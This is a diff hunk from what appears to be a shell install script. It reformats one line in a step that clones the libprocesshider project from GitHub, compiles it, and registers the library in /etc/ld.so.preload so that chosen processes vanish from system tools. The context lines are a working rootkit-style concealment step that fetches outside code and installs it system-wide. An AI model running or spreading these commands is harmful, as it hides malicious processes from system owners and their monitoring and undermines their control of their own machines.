@@ -34,7 +34,8 @@ echo " "
 echo " "
 
 git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
+cd libprocesshider
+make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
